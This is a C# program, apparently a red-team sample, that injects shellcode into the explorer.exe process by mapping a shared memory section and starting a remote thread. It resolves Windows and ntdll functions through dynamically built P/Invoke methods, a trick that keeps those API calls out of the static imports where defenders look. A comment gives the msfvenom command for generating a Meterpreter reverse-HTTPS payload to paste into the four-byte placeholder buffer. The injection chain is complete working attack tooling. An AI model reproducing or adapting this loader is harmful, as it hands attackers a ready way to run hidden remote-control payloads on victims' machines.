using System;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;


namespace Standard_Process_Injection_Dynamic_Invoke_Alternative
{
    class Program
    {
        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, argumentTypes);
        }
        public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId)
        {
            var paramterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "OpenProcess", argumentTypes, paramterTypes);
        }

        public static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "CreateRemoteThread", argumentTypes, paramterTypes);
        }

        public static IntPtr GetCurrentProcess()
        {
            var parameterTypes = new Type[] { };
            var argumentTypes = new object[] { };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "GetCurrentProcess", argumentTypes, parameterTypes);
        }

        public static UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
            var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(UInt32), typeof(UInt32), typeof(IntPtr) };
            var argumentTypes = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), "ntdll.dll", "NtCreateSection", argumentTypes, parameterTypes);

            section = (IntPtr)argumentTypes[0];
            MaxSize = (long)argumentTypes[3];

            return result;
        }

        public static UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), "ntdll.dll", "NtMapViewOfSection", argumentTypes, parameterTypes);

            BaseAddress = (IntPtr)argumentTypes[2];
            SectionOffset = (long)argumentTypes[5];
            ViewSize = (long)argumentTypes[6];

            return result;
        }


        public static uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var argumentTypes = new object[] { hProc, baseAddr };
            return (uint)DynamicInvoke(typeof(uint), "ntdll.dll", "NtUnmapViewOfSection", argumentTypes, parameterTypes);
        }

        public static int NtClose(IntPtr hObject)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var argumentTypes = new object[] { hObject };
            return (int)DynamicInvoke(typeof(int), "ntdll.dll", "NtClose", argumentTypes, parameterTypes);
        }
        static int Main(string[] args)
        {

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp
            byte[] buf = new byte[4] { 0xfc, 0x48, 0x83, 0xe4 };

            long buffer_size = buf.Length;

            // Create the section handle.
            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            // Map a view of a section into the virtual address space of the current process.
            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            // Copy the shellcode into the mapped section.
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            // Map a view of the section in the virtual address space of the targeted process.
            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            // Unmap the view of the section from the current process & close the handle.
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
    }
}
